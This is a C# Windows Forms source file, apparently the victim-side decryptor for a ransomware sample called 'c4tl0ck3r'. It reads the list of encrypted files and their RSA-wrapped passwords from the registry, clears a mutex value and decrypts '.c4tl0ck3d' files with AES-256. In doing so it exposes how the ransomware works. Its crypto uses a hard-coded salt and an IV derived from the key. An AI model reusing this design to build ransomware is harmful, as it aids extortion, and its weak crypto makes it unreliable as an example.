using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
// https://github.com/jrnker/CSharp-easy-RSA-PEM
using CSharp_easy_RSA_PEM;

namespace DesEncriptador {
    public partial class Form1 : Form {

        private static string clavePrivada = null;

        private void Form1_Load(object sender, EventArgs e) {

        }

        public Form1() {
            InitializeComponent();
        }

        // Funcion para desencritar con RSA un texto usando una clave privada
        public static string DesEncriptarRSA(string str) {
            RSACryptoServiceProvider privc = Crypto.DecodeRsaPrivateKey(clavePrivada);
            return Crypto.DecryptString(str, privc);
        }

        // Funcion para desencriptar un fichero con AES256 (FileStream)
        public void DesencriptarArchivo(string file, string password) {
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            // Genera un hash SHA256 de la contraseña
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            string fileDecrypted = file.Replace(".c4tl0ck3d", "");

            // Bytes de sal xD
            byte[] saltBytes = new byte[] { 3, 5, 7, 11, 13, 17, 19, 23 };

            using (FileStream ms = new FileStream(fileDecrypted, FileMode.OpenOrCreate, FileAccess.Write)) {
                using (RijndaelManaged AES = new RijndaelManaged()) {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)) {
                        using (FileStream InputFile = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)) {
                            int data;
                            int max_bytes_encrypt = 100 * 1024 * 1024;
                            int byte_num = 0;
                            while ((data = InputFile.ReadByte()) != -1 && byte_num < max_bytes_encrypt) {
                                cs.WriteByte((byte)data);
                                byte_num++;
                            }
                            InputFile.Close();
                        }
                        cs.Close();
                    }
                }
                ms.Close();
            }

            File.Delete(file);
            // Renombro el fichero
            //File.Move(file, fileDecrypted);

        }

        private void button1_Click(object sender, EventArgs e) {
            // Pido la clave privada(recibida por el medio que se vea conveniente)
            if (openFileDialog1.ShowDialog() == DialogResult.OK) {
                clavePrivada = File.ReadAllText(openFileDialog1.FileName);

                // Obtengo los ficheros encriptados del registro del sistema
                Microsoft.Win32.RegistryKey regKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("c4tl0ck3r");
                // Quito la exclusion mutua
                regKey.DeleteValue("mutex");
                foreach (string fichero in regKey.GetValueNames()) {
                    // Desencripto el RSA
                    string password = DesEncriptarRSA(regKey.GetValue(fichero).ToString());

                    // Quito el fichero de la lista en el registro del sistema
                    regKey.DeleteValue(fichero);

                    // Inicio la desencriptacion del fichero
                    new Task(() => { DesencriptarArchivo(fichero, password); }).Start();
                }
                regKey.Close();
            }
        }
    }
}
